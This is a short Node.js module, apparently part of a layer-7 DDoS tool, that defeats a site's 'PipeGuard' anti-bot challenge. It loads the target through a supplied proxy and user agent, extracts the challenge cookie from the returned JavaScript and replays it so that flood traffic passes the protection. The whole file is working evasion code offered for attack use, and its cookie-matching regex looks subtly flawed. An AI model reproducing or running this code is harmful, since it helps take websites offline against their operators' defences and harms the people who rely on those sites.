module.exports = function PipeGuard() {
    const request = require('request');

    function Bypasser(body, callback) {
        callback(body.match(/PipeGuard=([^\\s;]*)/)[0]);
    }

    return function bypass(proxy, uagent, callback) {
        request({
            url: l7.target,
            method: "GET",
            gzip: true,
            followAllRedirects: true,
            jar: true,
            proxy: proxy,
            headers: {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9'
            }
        }, (err, res, body) => {
            if (err || !res || !body || body.indexOf('document.cookie = "PipeGuard=') == -1) {
                return false;
            }
            Bypasser(body, cookies => {
                request({
                    url: l7.target,
                    method: "GET",
                    gzip: true,
                    proxy: proxy,
                    followAllRedirects: true,
                    jar: true,
                    headers: {
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cookie': cookies
                    }
                }, (err, res, body) => {
                    if (res && res.request.headers.Cookie) {
                        //console.log(res.request.headers.Cookie);
                        callback(res.request.headers.Cookie);
                    }
                    /*if (err || !res || !body) {
                        return false;
                    }*/
                });
            })
        });
    }
}